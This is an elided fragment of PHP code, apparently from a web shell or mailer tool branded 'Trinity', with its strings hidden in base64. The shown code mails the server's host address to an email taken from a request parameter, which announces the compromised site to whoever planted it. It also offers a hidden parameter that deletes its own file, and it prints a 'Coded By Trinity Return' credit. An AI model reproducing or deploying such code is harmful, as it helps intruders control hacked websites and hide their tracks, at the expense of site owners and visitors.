...
$fortest = $_GET[base64_decode('ZW1haWw=')];
  ...
  if(mail("$ae7927c74",base64_decode('W1RyaW5pdHld'),"http://$n466f2ffc")) {
   echo '';
} else {
   echo '';
}   
...
if(isset($_GET[base64_decode('cmVtb3ZlbWU=')]) == true) {
  if(@unlink(preg_replace(base64_decode('IVwoXGQrXClccy4qIQ=='), '', __FILE__)))
      die(base64_decode('PHA+PHNwYW4gc3R5bGU9ImNvbG9yOiNGRjAwMDA7Ij5UcmluaXR5IGhhcyBiZWVuIHJlbW92ZWQgRnJvbSB0aGlzIFNlcnZlcjwvc3Bhbj48L3A+'));
    else
...
echo base64_decode('');
...
echo base64_decode('PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPjxiciAvPgp0ckBwcm90b25tYWlsLmNvbSA8Zm9udCBjb2xvcj0icmVkIj41Ljc8L2ZvbnQ+LCBDb2RlZCBCeSA8Zm9udCBjb2xvcj0icmVkIj5UcmluaXR5IFJldHVybjwvZm9udD48L3A+Cg==');
